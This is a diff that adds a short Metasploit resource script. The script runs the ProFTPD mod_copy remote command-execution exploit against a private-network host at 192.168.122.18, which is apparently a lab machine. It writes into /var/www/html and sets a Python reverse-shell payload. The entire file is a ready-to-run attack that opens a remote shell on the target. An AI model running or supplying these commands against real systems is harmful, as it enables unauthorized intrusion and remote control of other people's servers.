@@ -1,0 +1,5 @@
+use exploit/unix/ftp/proftpd_modcopy_exec
+set SITEPATH /var/www/html
+set RHOSTS 192.168.122.18
+set PAYLOAD cmd/unix/reverse_python
+run
